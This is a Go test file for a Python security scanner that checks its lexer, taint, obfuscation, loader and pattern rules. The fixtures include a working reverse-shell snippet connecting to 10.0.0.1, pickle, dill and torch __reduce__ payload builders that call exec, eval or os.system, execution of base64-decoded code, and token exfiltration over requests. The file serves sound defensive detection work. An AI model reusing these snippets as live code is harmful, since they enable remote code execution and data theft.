package pysrc

import (
	"strings"
	"testing"

	"github.com/fr0g-66723067-io/sc4n/internal/artifact"
	"github.com/fr0g-66723067-io/sc4n/internal/limits"
	"github.com/fr0g-66723067-io/sc4n/internal/report"
	"github.com/fr0g-66723067-io/sc4n/internal/source"
)

func newTestCtx(t *testing.T) (*artifact.Ctx, *report.Collector) {
	t.Helper()
	c := report.NewCollector(0)
	l := limits.Default()
	sess := artifact.NewSession(c, "", l)
	return sess.NewCtx("test.py", l), c
}

func ids(c *report.Collector) map[string]bool {
	out := map[string]bool{}
	for _, f := range c.Findings() {
		out[f.RuleID] = true
	}
	return out
}

func analyzeOK(t *testing.T, src string) map[string]bool {
	t.Helper()
	ctx, c := newTestCtx(t)
	Analyze(ctx, []byte(src))
	return ids(c)
}

func wantRule(t *testing.T, got map[string]bool, rule string) {
	t.Helper()
	if !got[rule] {
		t.Fatalf("missing %s; got %v", rule, keys(got))
	}
}

func keys(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// ---- lexer --------------------------------------------------------------------

func kinds(toks []Token) []Kind {
	out := make([]Kind, 0, len(toks))
	for _, tk := range toks {
		out = append(out, tk.Kind)
	}
	return out
}

func countKindToks(toks []Token, k Kind) int {
	n := 0
	for _, tk := range toks {
		if tk.Kind == k {
			n++
		}
	}
	return n
}

func TestLexFString(t *testing.T) {
	src := []byte(`x = f"{a+1} {b!r:>{w}} {c}"`)
	toks := Lex(src)
	if countKindToks(toks, TokString) != 1 {
		t.Fatalf("f-string: want 1 string token, kinds=%v", kinds(toks))
	}
	// The whole f-string, including the nested {w}, must be one token.
	found := false
	for _, tk := range toks {
		if tk.Kind == TokString {
			txt := tk.Text(src)
			if !strings.HasPrefix(txt, `f"`) || !strings.HasSuffix(txt, `"`) {
				t.Fatalf("f-string token = %q", txt)
			}
			found = true
		}
	}
	if !found {
		t.Fatal("no string token")
	}
}

func TestLexTripleQuoted(t *testing.T) {
	src := []byte("s = \"\"\"a\nb\"\"\"\n")
	toks := Lex(src)
	if countKindToks(toks, TokString) != 1 {
		t.Fatalf("triple-quoted: want 1 string token, kinds=%v", kinds(toks))
	}
}

func TestLexSemicolonStatements(t *testing.T) {
	ctx, c := newTestCtx(t)
	src := []byte("a = 1; b = 2\n")
	stmts := Statements(src, Lex(src))
	if len(stmts) != 2 {
		t.Fatalf("`;` split: want 2 statements, got %d", len(stmts))
	}
	_ = ctx
	_ = c
}

func TestLexIndentDedent(t *testing.T) {
	src := []byte("if x:\n    pass\n")
	toks := Lex(src)
	if countKindToks(toks, TokIndent) != 1 || countKindToks(toks, TokDedent) != 1 {
		t.Fatalf("indent/dedent: kinds=%v", kinds(toks))
	}
}

func TestLexSoftKeywords(t *testing.T) {
	src := []byte("match x:\n    case 1:\n        pass\n")
	toks := Lex(src)
	found := map[string]bool{}
	for _, tk := range toks {
		if tk.Kind == TokKeyword {
			found[tk.Text(src)] = true
		}
	}
	if !found["match"] || !found["case"] {
		t.Fatalf("soft keywords not lexed: %v", found)
	}
}

func TestLexTripleSingleQuotesAndPrefixes(t *testing.T) {
	src := []byte("a = rb'\\x00'\nb = u'''x'''\nc = f'{x!r}'\n")
	toks := Lex(src)
	if countKindToks(toks, TokString) != 3 {
		t.Fatalf("prefix strings: kinds=%v", kinds(toks))
	}
}

// ---- taint rules ---------------------------------------------------------------

func TestTaintExec(t *testing.T) {
	got := analyzeOK(t, "import base64\nc = base64.b64decode(\"AAAA\")\nexec(c)\n")
	wantRule(t, got, "SC4N-CODE-TAINT-EXEC")
}

func TestTaintShell(t *testing.T) {
	got := analyzeOK(t, "import os\nv = os.getenv(\"X\")\nos.system(v)\n")
	wantRule(t, got, "SC4N-CODE-TAINT-SHELL")
}

func TestTaintDeserialize(t *testing.T) {
	got := analyzeOK(t, "import urllib.request, pickle\nd = urllib.request.urlopen(\"http://x\").read()\nobj = pickle.loads(d)\n")
	wantRule(t, got, "SC4N-CODE-TAINT-DESERIALIZE")
}

func TestTaintDynamic(t *testing.T) {
	got := analyzeOK(t, "import os\nn = os.environ[\"ATTR\"]\ngetattr(obj, n)\n")
	wantRule(t, got, "SC4N-CODE-TAINT-DYNAMIC")
}

func TestTaintFileWrite(t *testing.T) {
	got := analyzeOK(t, "p = input()\nopen(p, \"w\")\n")
	wantRule(t, got, "SC4N-CODE-TAINT-FILE")
}

func TestTaintDelete(t *testing.T) {
	got := analyzeOK(t, "import sys, shutil\nt = sys.argv[1]\nshutil.rmtree(t)\n")
	wantRule(t, got, "SC4N-CODE-TAINT-DELETE")
}

func TestTaintNetwork(t *testing.T) {
	got := analyzeOK(t, "import os, requests\ntok = os.getenv(\"TOKEN\")\nrequests.post(url, data=tok)\n")
	wantRule(t, got, "SC4N-CODE-TAINT-NETWORK")
}

func TestTaintTemplate(t *testing.T) {
	got := analyzeOK(t, "import os, jinja2\ntpl = os.getenv(\"TPL\")\njinja2.Environment().from_string(tpl)\n")
	wantRule(t, got, "SC4N-CODE-TAINT-TEMPLATE")
	wantRule(t, got, "SC4N-LOADER-JINJA-FROMSTRING")
}

func TestNoTaintOnLiteralSink(t *testing.T) {
	got := analyzeOK(t, "import os\nos.system(\"id\")\n")
	if got["SC4N-CODE-TAINT-SHELL"] {
		t.Fatal("a literal argument must not be reported as tainted")
	}
}

// ---- obfuscation ---------------------------------------------------------------

func TestObfuscationChrChain(t *testing.T) {
	got := analyzeOK(t, "s = chr(97) + chr(98) + chr(99)\n")
	wantRule(t, got, "SC4N-CODE-OBFUSCATION")
}

func TestObfuscationEscapeRun(t *testing.T) {
	got := analyzeOK(t, "s = \"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\\x51\"\n")
	wantRule(t, got, "SC4N-CODE-OBFUSCATION")
}

func TestEncodedPayload(t *testing.T) {
	got := analyzeOK(t, "import base64\nv = base64.b64decode('cHJpbnQoMSk=cHJpbnQoMSk=cHJpbnQoMSk=cHJpbnQoMSk=')\n")
	wantRule(t, got, "SC4N-CODE-ENCODED-PAYLOAD")
}

func TestCompileExec(t *testing.T) {
	got := analyzeOK(t, "compile(src, \"<x>\", \"exec\")\n")
	wantRule(t, got, "SC4N-CODE-COMPILE-EXEC")
}

// ---- loader lint ---------------------------------------------------------------

func TestLoaderTorchUnsafe(t *testing.T) {
	wantRule(t, analyzeOK(t, "import torch\ntorch.load(\"m.pt\")\n"), "SC4N-LOADER-TORCH-UNSAFE")
}

func TestLoaderTorchSafe(t *testing.T) {
	got := analyzeOK(t, "import torch\ntorch.load(\"m.pt\", weights_only=True)\n")
	if got["SC4N-LOADER-TORCH-UNSAFE"] {
		t.Fatal("weights_only=True must not be reported")
	}
}

func TestLoaderPickleRemote(t *testing.T) {
	got := analyzeOK(t, "import urllib.request, pickle\nd = urllib.request.urlopen(u).read()\npickle.loads(d)\n")
	wantRule(t, got, "SC4N-LOADER-PICKLE-REMOTE")
}

func TestLoaderTrustRemoteCode(t *testing.T) {
	got := analyzeOK(t, "AutoModel.from_pretrained(\"o/m\", trust_remote_code=True, revision=\"0123456789abcdef0123456789abcdef01234567\")\n")
	wantRule(t, got, "SC4N-LOADER-TRUST-REMOTE-CODE")
}

func TestLoaderAllowPickle(t *testing.T) {
	wantRule(t, analyzeOK(t, "import numpy\nnumpy.load(f, allow_pickle=True)\n"), "SC4N-LOADER-ALLOW-PICKLE")
}

func TestLoaderNoRevision(t *testing.T) {
	wantRule(t, analyzeOK(t, "hf_hub_download(\"o/m\", \"f.bin\")\n"), "SC4N-LOADER-NO-REVISION")
}

func TestLoaderRevisionPinned(t *testing.T) {
	got := analyzeOK(t, "hf_hub_download(\"o/m\", \"f.bin\", revision=\"0123456789abcdef0123456789abcdef01234567\")\n")
	if got["SC4N-LOADER-NO-REVISION"] {
		t.Fatal("a 40-hex revision must count as pinned")
	}
}

func TestLoaderNoLocalOnly(t *testing.T) {
	wantRule(t, analyzeOK(t, "AutoModel.from_pretrained(\"./local\", revision=r)\n"), "SC4N-LOADER-NO-LOCAL-ONLY")
}

func TestLoaderYAMLUnsafe(t *testing.T) {
	wantRule(t, analyzeOK(t, "import yaml\nyaml.load(open(\"x.yml\"))\n"), "SC4N-LOADER-YAML-UNSAFE")
}

func TestLoaderYAMLSafe(t *testing.T) {
	got := analyzeOK(t, "import yaml\nyaml.load(f, Loader=yaml.SafeLoader)\n")
	if got["SC4N-LOADER-YAML-UNSAFE"] {
		t.Fatal("SafeLoader must not be reported")
	}
}

func TestLoaderKerasSafeMode(t *testing.T) {
	wantRule(t, analyzeOK(t, "tf.keras.models.load_model(\"m.keras\", safe_mode=False)\n"), "SC4N-LOADER-KERAS-SAFE-MODE")
}

func TestLoaderKerasLambda(t *testing.T) {
	wantRule(t, analyzeOK(t, "keras.layers.Lambda(f)\n"), "SC4N-LOADER-KERAS-LAMBDA")
}

// ---- notebook ------------------------------------------------------------------

func TestNotebookLineMapping(t *testing.T) {
	// The magic sits on physical line 3 of the .ipynb.
	raw := "{\n" +
		" \"cells\": [\n" +
		"  {\"cell_type\": \"code\", \"source\": [\"!id\\n\"]}\n" +
		" ]\n" +
		"}\n"
	ctx, c := newTestCtx(t)
	AnalyzeNotebook(ctx, []byte(raw))
	found := false
	for _, f := range c.Findings() {
		if f.RuleID == "SC4N-CODE-NOTEBOOK-MAGIC" {
			found = true
			if f.Line == nil || *f.Line != 3 {
				t.Fatalf("notebook magic line = %v, want 3", f.Line)
			}
		}
	}
	if !found {
		t.Fatalf("no notebook magic finding; got %v", keys(ids(c)))
	}
}

func TestNotebookCodeRulesRun(t *testing.T) {
	raw := "{\"cells\":[{\"cell_type\":\"code\",\"source\":[\"import base64\\n\",\"exec(base64.b64decode('cHJpbnQoMSk=cHJpbnQoMSk=cHJpbnQoMSk=cHJpbnQoMSk='))\\n\"]}],\"nbformat\":4}"
	ctx, c := newTestCtx(t)
	AnalyzeNotebook(ctx, []byte(raw))
	got := ids(c)
	wantRule(t, got, "SC4N-CODE-TAINT-EXEC")
}

// ---- dispatch -----------------------------------------------------------------

func TestSniffPythonNameGate(t *testing.T) {
	l := limits.Default()
	cases := []struct {
		name string
		body string
		want bool
	}{
		// A known extension that does not mean Python is rejected before the
		// content heuristic runs, whatever the content looks like.
		{"card.md", "# Model Card\n\n## Usage\n\n### Notes\n", false},
		{"main.cpp", "// comment\n#include <vector>\nclass Foo {};\nreturn 0;\n", false},
		{"app.ts", "// comment\nimport { x } from 'y';\nclass Foo {}\nreturn x;\n", false},
		{"shader.wgsl", "// comment\n@group(0) @binding(0)\nclass Foo {}\nreturn x;\n", false},
		{"run.sh", "#!/bin/sh\n# comment\nprint(1)\nfrom x import y\n", false},
		{"index.json", "{\"a\": 1}\n", false},
		{"data.txt", "# comment\ndef f():\n    return 1\n", false},
		// Python extensions are claimed by name, and a Python-shaped file with an
		// unhelpful name is claimed by content.
		{"mod.py", "x = 1\n", true},
		{"types.pyi", "def f() -> int: ...\n", true},
		{"run", "import os\nimport sys\n\ndef main():\n    return 0\n", true},
		{"script", "from os import path\nprint(1)\nclass A:\n    pass\n", true},
		{"container.zip:code/train.py", "x = 1\n", true},
		{"container.zip:docs/card.md", "# Card\n\n## Usage\n\n### Notes\n", false},
		// Comments alone, however many, are not Python: '#' is C, shell, YAML and
		// Markdown syntax too.
		{"notes", "# one\n# two\n# three\n# four\n", false},
	}
	for _, tc := range cases {
		got, _ := sniffPython(source.Mem(tc.name, []byte(tc.body)), l)
		if (got == artifact.FormatPython) != tc.want {
			t.Errorf("sniffPython(%q) = %v, want python=%v", tc.name, got, tc.want)
		}
	}
}

// TestReduceBuilder pins the payload-generator rule: a reducing class that returns
// a code-executing callable *and* a serialiser dump in the same artifact. The two
// published shapes are covered, and each half alone must not fire.
func TestReduceBuilder(t *testing.T) {
	cases := []struct {
		name string
		src  string
		want bool
	}{
		{"bare tuple return", `import pickle


class E:
    def __reduce__(self):
        return eval, ("1+1",)


pickle.dump(E(), open("p.pkl", "wb"))
`, true},
		{"parenthesised return", `import dill


class E:
    def __reduce__(self):
        return (exec, ("print(1)",))


dill.dump(E(), open("p.pkl", "wb"))
`, true},
		{"torch.save", `import torch


class E:
    def __reduce__(self):
        return os.system, ("id",)


torch.save(E(), "p.pt")
`, true},
		{"plain callable and a dump", `import pickle


class P:
    def __reduce__(self):
        return (self.x, ())


pickle.dump(P(), open("p.pkl", "wb"))
`, false},
		{"exec return but no dump", `class I:
    def __reduce__(self):
        return exec, ("print(1)",)


x = I()
`, false},
		{"dump but no reducing class", `import pickle

pickle.dump({"a": 1}, open("p.pkl", "wb"))
`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := analyzeOK(t, c.src)
			if got["SC4N-CODE-REDUCE-BUILDER"] != c.want {
				t.Fatalf("SC4N-CODE-REDUCE-BUILDER = %v, want %v (findings %v)",
					got["SC4N-CODE-REDUCE-BUILDER"], c.want, keys(got))
			}
		})
	}
}

// TestReverseShell pins the combination rule: a socket constructor, a connect
// call, a receive call and a command sink in one artifact. The payload text a
// generator embeds in a string literal counts, because that is where the published
// generators put it.
func TestReverseShell(t *testing.T) {
	cases := []struct {
		name string
		src  string
		want bool
	}{
		{"payload in a string literal", `import textwrap

payload = textwrap.dedent("""
def rev_shell():
    import socket, subprocess
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.0.0.1", 8080))
    cmd = s.recv(1024).decode()
    out = subprocess.getoutput(cmd)
    s.sendall(out.encode())
""").strip()
`, true},
		{"live code", `import socket, os

s = socket.socket()
s.connect(("10.0.0.1", 4444))
cmd = s.recv(4096)
os.system(cmd)
`, true},
		{"socket and command sink but no connect or recv", `import socket, subprocess

s = socket.socket()
subprocess.run(["id"])
`, false},
		{"only a socket constructor", `import socket

s = socket.socket()
`, false},
		{"server that echoes without a command sink", `import socket

s = socket.socket()
s.bind(("0.0.0.0", 9000))
s.listen(1)
conn, addr = s.accept()
data = conn.recv(1024)
conn.sendall(data)
`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := analyzeOK(t, c.src)
			if got["SC4N-CODE-REVERSE-SHELL"] != c.want {
				t.Fatalf("SC4N-CODE-REVERSE-SHELL = %v, want %v (findings %v)",
					got["SC4N-CODE-REVERSE-SHELL"], c.want, keys(got))
			}
		})
	}
}

// TestRemoteToolLoader pins transformers.load_tool: a literal 'org/repo' names a
// repository whose Python module is imported and run in this process. A local
// directory and a run-time-built name are not literals of that shape.
func TestRemoteToolLoader(t *testing.T) {
	cases := []struct {
		name string
		src  string
		want bool
	}{
		{"module-prefixed literal repo", `import transformers

transformers.load_tool('Retr0REG/huggingface-hub-tools-deserialization')
`, true},
		{"bare load_tool with a repo", `from transformers import load_tool

tool = load_tool("org/tool")
`, true},
		{"local directory", `from transformers import load_tool

tool = load_tool("./tools/local")
`, false},
		{"no arguments", `from transformers import load_tool

tool = load_tool()
`, false},
		{"name built at run time", `from transformers import load_tool

name = "org" + "/tool"
tool = load_tool(name)
`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := analyzeOK(t, c.src)
			if got["SC4N-CODE-REMOTE-TOOL-LOADER"] != c.want {
				t.Fatalf("SC4N-CODE-REMOTE-TOOL-LOADER = %v, want %v (findings %v)",
					got["SC4N-CODE-REMOTE-TOOL-LOADER"], c.want, keys(got))
			}
		})
	}
}

// TestAgentCodeExec pins the agent-with-a-code-executor shape: a code executor, an
// agent constructor and a tool surface that reaches outside the process. Any one of
// the three alone is an ordinary import.
func TestAgentCodeExec(t *testing.T) {
	cases := []struct {
		name string
		src  string
		want bool
	}{
		{"executor plus MCP tools", `from google.adk.agents import Agent
from google.adk.code_executors import BuiltInCodeExecutor
from google.adk.tools.mcp_tool.mcp_toolset import MCPToolset

helper = Agent(
    name="ops",
    tools=[BuiltInCodeExecutor, MCPToolset],
)
`, true},
		{"executor plus retrieval", `from google.adk.agents import LlmAgent
from google.adk.code_executors import BuiltInCodeExecutor
from google.adk.tools.retrieval.vertex_ai_rag_retrieval import VertexAiRagRetrieval

docs = VertexAiRagRetrieval(name="docs")
agent = LlmAgent(name="r", tools=[BuiltInCodeExecutor], sub_agents=[docs])
`, true},
		{"agent and tools without an executor", `from google.adk.agents import LlmAgent
from google.adk.tools.mcp_tool.mcp_toolset import MCPToolset

agent = LlmAgent(name="r", tools=[MCPToolset])
`, false},
		{"executor with no agent", `from google.adk.code_executors import BuiltInCodeExecutor

tools = [BuiltInCodeExecutor]
`, false},
		{"agent with an executor but no tool surface", `from google.adk.agents import Agent
from google.adk.code_executors import BuiltInCodeExecutor

agent = Agent(name="calc", tools=[BuiltInCodeExecutor])
`, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := analyzeOK(t, c.src)
			if got["SC4N-CODE-AGENT-CODE-EXEC"] != c.want {
				t.Fatalf("SC4N-CODE-AGENT-CODE-EXEC = %v, want %v (findings %v)",
					got["SC4N-CODE-AGENT-CODE-EXEC"], c.want, keys(got))
			}
		})
	}
}
